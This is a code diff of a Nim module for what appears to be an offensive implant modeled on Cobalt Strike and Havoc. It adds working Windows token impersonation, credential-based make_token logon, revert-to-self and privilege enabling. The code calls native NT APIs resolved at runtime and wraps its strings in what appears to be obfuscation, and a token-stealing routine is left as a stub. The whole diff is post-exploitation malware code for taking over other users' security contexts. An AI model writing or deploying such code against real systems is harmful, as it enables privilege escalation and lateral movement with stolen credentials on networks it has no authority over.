@@ -4,6 +4,8 @@ import ../../common/[types, utils]
 
 #[
     Token impersonation & manipulation 
+
+    Resources: 
     - https://maldevacademy.com/new/modules/57
     - https://www.nccgroup.com/research-blog/demystifying-cobalt-strike-s-make_token-command/ 
     - https://github.com/HavocFramework/Havoc/blob/main/payloads/Demon/src/core/Token.c
@@ -16,39 +18,61 @@ type
     NtQueryInformationToken = proc(hToken: HANDLE, tokenInformationClass: TOKEN_INFORMATION_CLASS, tokenInformation: PVOID, tokenInformationLength: ULONG, returnLength: PULONG): NTSTATUS {.stdcall.}
     NtOpenThreadToken = proc(threadHandle: HANDLE, desiredAccess: ACCESS_MASK, openAsSelf: BOOLEAN, tokenHandle: PHANDLE): NTSTATUS {.stdcall.}
     NtOpenProcessToken = proc(processHandle: HANDLE, desiredAccess: ACCESS_MASK, tokenHandle: PHANDLE): NTSTATUS {.stdcall.}
-    
     ConvertSidToStringSidA = proc(sid: PSID, stringSid: ptr LPSTR): NTSTATUS {.stdcall.}
+    NtSetInformationThread = proc(hThread: HANDLE, threadInformationClass: THREADINFOCLASS, threadInformation: PVOID, threadInformationLength: ULONG): NTSTATUS {.stdcall.}
+    NtDuplicateToken = proc(existingTokenHandle: HANDLE, desiredAccess: ACCESS_MASK, objectAttributes: POBJECT_ATTRIBUTES, effectiveOnly: BOOLEAN, tokenType: TOKEN_TYPE, newTokenHandle: PHANDLE): NTSTATUS {.stdcall.}
+    NtAdjustPrivilegesToken = proc(hToken: HANDLE, disableAllPrivileges: BOOLEAN, newState: PTOKEN_PRIVILEGES, bufferLength: ULONG, previousState: PTOKEN_PRIVILEGES, returnLength: PULONG): NTSTATUS {.stdcall.}
+    NtClose = proc(handle: HANDLE): NTSTATUS {.stdcall.}
 
+    Apis = object
+        NtOpenProcessToken: NtOpenProcessToken
+        NtOpenThreadToken: NtOpenThreadToken
+        NtQueryInformationToken: NtQueryInformationToken
+        ConvertSidToSTringSidA: ConvertSidToSTringSidA
+        NtSetInformationThread: NtSetInformationThread
+        NtDuplicateToken: NtDuplicateToken
+        NtAdjustPrivilegesToken: NtAdjustPrivilegesToken 
+        NtClose: NtClose
+
+proc initApis(): Apis = 
+    let hNtdll = GetModuleHandleA(protect("ntdll"))
+
+    result.NtOpenProcessToken = cast[NtOpenProcessToken](GetProcAddress(hNtdll, protect("NtOpenProcessToken")))
+    result.NtOpenThreadToken = cast[NtOpenThreadToken](GetProcAddress(hNtdll, protect("NtOpenThreadToken")))
+    result.NtQueryInformationToken = cast[NtQueryInformationToken](GetProcAddress(hNtdll, protect("NtQueryInformationToken")))
+    result.ConvertSidToStringSidA = cast[ConvertSidToStringSidA](GetProcAddress(GetModuleHandleA(protect("advapi32.dll")), protect("ConvertSidToStringSidA")))
+    result.NtSetInformationThread = cast[NtSetInformationThread](GetProcAddress(hNtdll, protect("NtSetInformationThread")))
+    result.NtDuplicateToken = cast[NtDuplicateToken](GetProcAddress(hNtdll, protect("NtDuplicateToken")))
+    result.NtClose = cast[NtClose](GetProcAddress(hNtdll, protect("NtClose")))
+    result.NtAdjustPrivilegesToken = cast[NtAdjustPrivilegesToken](GetProcAddress(hNtdll, protect("NtAdjustPrivilegesToken")))
+
+    
 const 
-    CURRENT_THREAD = cast[HANDLE](-2)
     CURRENT_PROCESS = cast[HANDLE](-1)
+    CURRENT_THREAD = cast[HANDLE](-2)
 
 proc getCurrentToken*(desiredAccess: ACCESS_MASK = TOKEN_QUERY): HANDLE = 
+    let apis = initApis() 
+
     var 
         status: NTSTATUS = 0
         hToken: HANDLE 
 
-    let hNtdll = GetModuleHandleA(protect("ntdll"))
-    let 
-        pNtOpenThreadToken = cast[NtOpenThreadToken](GetProcAddress(hNtdll, protect("NtOpenThreadToken")))
-        pNtOpenProcessToken = cast[NtOpenProcessToken](GetProcAddress(hNtdll, protect("NtOpenProcessToken")))
-    
     # https://ntdoc.m417z.com/ntopenthreadtoken, token-info fails with error ACCESS_DENIED if OpenAsSelf is set to
-    status = pNtOpenThreadToken(CURRENT_THREAD, desiredAccess, TRUE, addr hToken)
+    status = apis.NtOpenThreadToken(CURRENT_THREAD, desiredAccess, TRUE, addr hToken)
     if status != STATUS_SUCCESS:
-        status = pNtOpenProcessToken(CURRENT_PROCESS, desiredAccess, addr hToken)
+        status = apis.NtOpenProcessToken(CURRENT_PROCESS, desiredAccess, addr hToken)
         if status != STATUS_SUCCESS: 
             raise newException(CatchableError, protect("NtOpenProcessToken ") & $status.toHex())
 
     return hToken
 
-proc sidToString(sid: PSID): string = 
-    let pConvertSidToStringSidA = cast[ConvertSidToStringSidA](GetProcAddress(GetModuleHandleA(protect("advapi32.dll")), protect("ConvertSidToStringSidA")))
+proc sidToString(apis: Apis, sid: PSID): string = 
     var stringSid: LPSTR 
-    discard pConvertSidToStringSidA(sid, addr stringSid)
+    discard apis.ConvertSidToStringSidA(sid, addr stringSid)
     return $stringSid
 
-proc sidToName(sid: PSID): string = 
+proc sidToName(apis: Apis, sid: PSID): string = 
     var 
         usernameSize: DWORD = 0
         domainSize: DWORD = 0
@@ -63,7 +87,7 @@ proc sidToName(sid: PSID): string =
         return $domain[0 ..< int(domainSize)] & "\\" & $username[0 ..< int(usernameSize)]
     return ""
 
-proc privilegeToString(luid: PLUID): string =
+proc privilegeToString(apis: Apis, luid: PLUID): string =
     var privSize: DWORD = 0
 
     # Retrieve required size
@@ -77,16 +101,13 @@ proc privilegeToString(luid: PLUID): string =
 #[
     Retrieve and return information about an access token
 ]#
-
-proc getTokenStatistics(hToken: HANDLE): tuple[tokenId, tokenType: string] = 
+proc getTokenStatistics(apis: Apis, hToken: HANDLE): tuple[tokenId, tokenType: string] = 
     var
         status: NTSTATUS = 0
         returnLength: ULONG = 0
         pStats: TOKEN_STATISTICS
 
-    let pNtQueryInformationToken = cast[NtQueryInformationToken](GetProcAddress(GetModuleHandleA(protect("ntdll")), protect("NtQueryInformationToken")))
-
-    status = pNtQueryInformationToken(hToken, tokenStatistics, addr pStats, cast[ULONG](sizeof(pStats)), addr returnLength)
+    status = apis.NtQueryInformationToken(hToken, tokenStatistics, addr pStats, cast[ULONG](sizeof(pStats)), addr returnLength)
     if status != STATUS_SUCCESS: 
         raise newException(CatchableError, protect("NtQueryInformationToken - Token Statistics ") & $status.toHex())
 
@@ -96,15 +117,13 @@ proc getTokenStatistics(hToken: HANDLE): tuple[tokenId, tokenType: string] =
 
     return (tokenId, tokenType)
 
-proc getTokenUser(hToken: HANDLE): tuple[username, sid: string] = 
+proc getTokenUser(apis: Apis, hToken: HANDLE): tuple[username, sid: string] = 
     var
         status: NTSTATUS = 0
         returnLength: ULONG = 0
         pUser: PTOKEN_USER
 
-    let pNtQueryInformationToken = cast[NtQueryInformationToken](GetProcAddress(GetModuleHandleA(protect("ntdll")), protect("NtQueryInformationToken")))
-
-    status = pNtQueryInformationToken(hToken, tokenUser, NULL, 0, addr returnLength)
+    status = apis.NtQueryInformationToken(hToken, tokenUser, NULL, 0, addr returnLength)
     if status != STATUS_SUCCESS and status != STATUS_BUFFER_TOO_SMALL:
         raise newException(CatchableError, protect("NtQueryInformationToken - Token User [1] ") & $status.toHex())
     
@@ -113,21 +132,19 @@ proc getTokenUser(hToken: HANDLE): tuple[username, sid: string] =
         raise newException(CatchableError, $GetLastError())
     defer: LocalFree(cast[HLOCAL](pUser))
     
-    status = pNtQueryInformationToken(hToken, tokenUser, cast[PVOID](pUser), returnLength, addr returnLength)
+    status = apis.NtQueryInformationToken(hToken, tokenUser, cast[PVOID](pUser), returnLength, addr returnLength)
     if status != STATUS_SUCCESS:
         raise newException(CatchableError, protect("NtQueryInformationToken - Token User [2] ") & $status.toHex())
     
-    return (sidToName(pUser.User.Sid), sidToString(pUser.User.Sid))
+    return (apis.sidToName(pUser.User.Sid), apis.sidToString(pUser.User.Sid))
 
-proc getTokenGroups(hToken: HANDLE): string = 
+proc getTokenGroups(apis: Apis, hToken: HANDLE): string = 
     var
         status: NTSTATUS = 0
         returnLength: ULONG = 0
         pGroups: PTOKEN_GROUPS
 
-    let pNtQueryInformationToken = cast[NtQueryInformationToken](GetProcAddress(GetModuleHandleA(protect("ntdll")), protect("NtQueryInformationToken")))
-
-    status = pNtQueryInformationToken(hToken, tokenGroups, NULL, 0, addr returnLength)
+    status = apis.NtQueryInformationToken(hToken, tokenGroups, NULL, 0, addr returnLength)
     if status != STATUS_SUCCESS and status != STATUS_BUFFER_TOO_SMALL:
         raise newException(CatchableError, protect("NtQueryInformationToken - Token Groups [1] ") & $status.toHex())
     
@@ -136,7 +153,7 @@ proc getTokenGroups(hToken: HANDLE): string =
         raise newException(CatchableError, $GetLastError())
     defer: LocalFree(cast[HLOCAL](pGroups))
     
-    status = pNtQueryInformationToken(hToken, tokenGroups, cast[PVOID](pGroups), returnLength, addr returnLength)
+    status = apis.NtQueryInformationToken(hToken, tokenGroups, cast[PVOID](pGroups), returnLength, addr returnLength)
     if status != STATUS_SUCCESS:
         raise newException(CatchableError, protect("NtQueryInformationToken - Token Groups [2] ") & $status.toHex())
 
@@ -146,17 +163,15 @@ proc getTokenGroups(hToken: HANDLE): string =
 
     result &= fmt"Group memberships ({groupCount})" & "\n"
     for i, group in groups.toOpenArray(0, int(groupCount) - 1): 
-        result &= fmt" - {sidToString(group.Sid):<50} {sidToName(group.Sid)}" & "\n"
+        result &= fmt" - {apis.sidToString(group.Sid):<50} {apis.sidToName(group.Sid)}" & "\n"
 
-proc getTokenPrivileges(hToken: HANDLE): string = 
+proc getTokenPrivileges(apis: Apis, hToken: HANDLE): string = 
     var
         status: NTSTATUS = 0
         returnLength: ULONG = 0
         pPrivileges: PTOKEN_PRIVILEGES
         
-    let pNtQueryInformationToken = cast[NtQueryInformationToken](GetProcAddress(GetModuleHandleA(protect("ntdll")), protect("NtQueryInformationToken")))
-
-    status = pNtQueryInformationToken(hToken, tokenPrivileges, NULL, 0, addr returnLength)
+    status = apis.NtQueryInformationToken(hToken, tokenPrivileges, NULL, 0, addr returnLength)
     if status != STATUS_SUCCESS and status != STATUS_BUFFER_TOO_SMALL:
         raise newException(CatchableError, protect("NtQueryInformationToken - Token Privileges [1] ") & $status.toHex())
     
@@ -165,7 +180,7 @@ proc getTokenPrivileges(hToken: HANDLE): string =
         raise newException(CatchableError, $GetLastError())
     defer: LocalFree(cast[HLOCAL](pPrivileges))
     
-    status = pNtQueryInformationToken(hToken, tokenPrivileges, cast[PVOID](pPrivileges), returnLength, addr returnLength)
+    status = apis.NtQueryInformationToken(hToken, tokenPrivileges, cast[PVOID](pPrivileges), returnLength, addr returnLength)
     if status != STATUS_SUCCESS:
         raise newException(CatchableError, protect("NtQueryInformationToken - Token Privileges [2] ") & $status.toHex())
 
@@ -176,23 +191,82 @@ proc getTokenPrivileges(hToken: HANDLE): string =
     result &= fmt"Privileges ({privCount})" & "\n"
     for i, priv in privs.toOpenArray(0, int(privCount) - 1):
         let enabled = if priv.Attributes and SE_PRIVILEGE_ENABLED: "Enabled" else: "Disabled" 
-        result &= fmt" - {privilegeToString(addr priv.Luid):<50} {enabled}" & "\n"
+        result &= fmt" - {apis.privilegeToString(addr priv.Luid):<50} {enabled}" & "\n"
 
 
-proc getTokenInfo*(hToken: HANDLE): string =   
-    let (tokenId, tokenType) = hToken.getTokenStatistics()
+proc getTokenInfo*(hToken: HANDLE): string = 
+
+    let apis = initApis() 
+
+    let (tokenId, tokenType) = apis.getTokenStatistics(hToken)
     result &= fmt"TokenID: 0x{tokenId}" & "\n"
     result &= fmt"Type:    {tokenType}" & "\n"
 
-    let (username, sid) = hToken.getTokenUser()
+    let (username, sid) = apis.getTokenUser(hToken)
     result &= fmt"User:    {username}" & "\n"
     result &= fmt"SID:     {sid}" & "\n"
 
-    result &= hToken.getTokenGroups()
-    result &= hToken.getTokenPrivileges()
+    result &= apis.getTokenGroups(hToken    )
+    result &= apis.getTokenPrivileges(hToken)
 
-proc impersonateToken*(hToken: HANDLE) = 
-    discard
+#[
+    Impersonate token 
+    - https://github.com/HavocFramework/Havoc/blob/main/payloads/Demon/src/core/Token.c#L1281
+]#
+proc impersonate*(apis: Apis, hToken: HANDLE) = 
+    var 
+        status: NTSTATUS
+        qos: SECURITY_QUALITY_OF_SERVICE
+        oa: OBJECT_ATTRIBUTES 
+        impersonationToken: HANDLE = 0
+        returnLength: ULONG = 0
+        duplicated: bool = false 
+
+    if apis.getTokenStatistics(hToken).tokenType == protect("Primary"): 
+        # Create a duplicate impersonation token
+        qos.Length = cast[DWORD](sizeof(SECURITY_QUALITY_OF_SERVICE))
+        qos.ImpersonationLevel = securityImpersonation
+        qos.ContextTrackingMode = SECURITY_DYNAMIC_TRACKING
+        qos.EffectiveOnly = FALSE 
+
+        oa.Length = cast[DWORD](sizeof(OBJECT_ATTRIBUTES))
+        oa.RootDirectory = 0
+        oa.ObjectName = NULL 
+        oa.Attributes = 0
+        oa.SecurityDescriptor = NULL 
+        oa.SecurityQualityOfService = addr qos
+        
+        status = apis.NtDuplicateToken(hToken, TOKEN_IMPERSONATE or TOKEN_QUERY, addr oa, FALSE, tokenImpersonation, addr impersonationToken)
+        if status != STATUS_SUCCESS: 
+            raise newException(CatchableError, protect("NtDuplicateToken ") & $status.toHex())
+
+    else: 
+        # Use the original token if it is already an impersonation token
+        impersonationToken = hToken
+
+    # Impersonate the token in the current thread (ImpersonateLoggedOnUser)
+    status = apis.NtSetInformationThread(CURRENT_THREAD, threadImpersonationToken, addr impersonationToken, cast[ULONG](sizeof(HANDLE)))
+    if status != STATUS_SUCCESS: 
+        raise newException(CatchableError, protect("NtSetInformationThread ") & $status.toHex())
+
+    defer: discard apis.NtClose(impersonationToken)            
+
+#[
+    Revert to original access token
+    RevertToSelf() API implemented using Native API
+]#
+proc rev2self*() =
+    
+    let apis = initApis() 
+    
+    var 
+        status: NTSTATUS = 0
+        hToken: HANDLE = 0 
+
+    status = apis.NtSetInformationThread(CURRENT_THREAD, threadImpersonationToken, addr hToken, cast[ULONG](sizeof(HANDLE)))
+    
+    if status != STATUS_SUCCESS: 
+        raise newException(CatchableError, protect("RevertToSelf ") & $status.toHex())        
 
 #[
     Create a new access token from a username, password and domain name triplet.
@@ -205,44 +279,40 @@ proc impersonateToken*(hToken: HANDLE) =
     changes the output of the getTokenOwner function. The credentials are then validated by the LogonUserA function. 
 ]#
 proc makeToken*(username, password, domain: string, logonType: DWORD = LOGON32_LOGON_NEW_CREDENTIALS): string = 
+    
+    let apis = initApis()
+    
     if username == "" or password == "" or domain == "": 
         raise newException(CatchableError, protect("Invalid format."))
 
-    var 
-        hToken: HANDLE 
-        hImpersonationToken: HANDLE
+    rev2self() 
 
+    var hToken: HANDLE 
     let provider: DWORD = if logonType == LOGON32_LOGON_NEW_CREDENTIALS: LOGON32_PROVIDER_WINNT50 else: LOGON32_PROVIDER_DEFAULT
     if LogonUserA(username, domain, password, logonType, provider, addr hToken) == FALSE:
         raise newException(CatchableError, $GetLastError())
-    defer: CloseHandle(hToken)
+    defer: discard apis.NtClose(hToken)
 
-    if DuplicateTokenEx(hToken, TOKEN_QUERY or TOKEN_IMPERSONATE, NULL, securityImpersonation, tokenImpersonation, addr hImpersonationToken) == FALSE:
-        raise newException(CatchableError, $GetLastError())
-    
-    # Revert to self before impersonation
-    discard RevertToSelf() 
-    if ImpersonateLoggedOnUser(hImpersonationToken) == FALSE: 
-        CloseHandle(hImpersonationToken)
-        raise newException(CatchableError, $GetLastError())
+    apis.impersonate(hToken)
 
-    return hToken.getTokenUser.username
+    return apis.getTokenUser(hToken).username
 
-proc tokenSteal*(pid: int): bool = 
+proc stealToken*(pid: int): bool = 
     discard 
 
-proc rev2self*(): bool = 
-    return RevertToSelf()
-
 proc enablePrivilege*(privilegeName: string, enable: bool = true): string = 
+    
+    let apis = initApis()
+
     var 
+        status: NTSTATUS = 0
         tokenPrivs: TOKEN_PRIVILEGES
         oldTokenPrivs: TOKEN_PRIVILEGES
         luid: LUID 
         returnLength: DWORD
 
     let hToken = getCurrentToken(TOKEN_ADJUST_PRIVILEGES or TOKEN_QUERY) 
-    defer: CloseHandle(hToken)
+    defer: discard apis.NtClose(hToken)
 
     if LookupPrivilegeValueW(NULL, newWideCString(privilegeName), addr luid) == FALSE: 
         raise newException(CatchableError, $GetLastError())
@@ -252,8 +322,9 @@ proc enablePrivilege*(privilegeName: string, enable: bool = true): string =
     tokenPrivs.Privileges[0].Luid = luid 
     tokenPrivs.Privileges[0].Attributes = if enable: SE_PRIVILEGE_ENABLED else: 0
 
-    if AdjustTokenPrivileges(hToken, FALSE, addr tokenPrivs, cast[DWORD](sizeof(TOKEN_PRIVILEGES)), addr oldTokenPrivs, addr returnLength) == FALSE:
-        raise newException(CatchableError, $GetLastError())
+    status = apis.NtAdjustPrivilegesToken(hToken, FALSE, addr tokenPrivs, cast[DWORD](sizeof(TOKEN_PRIVILEGES)), addr oldTokenPrivs, addr returnLength)
+    if status != STATUS_SUCCESS: 
+        raise newException(CatchableError, protect("NtAdjustPrivilegesToken ") & $status.toHex())        
 
     let action = if enable: protect("Enabled") else: protect("Disabled")
-    return fmt"{action} {privilegeToString(addr luid)}."
+    return fmt"{action} {apis.privilegeToString(addr luid)}."
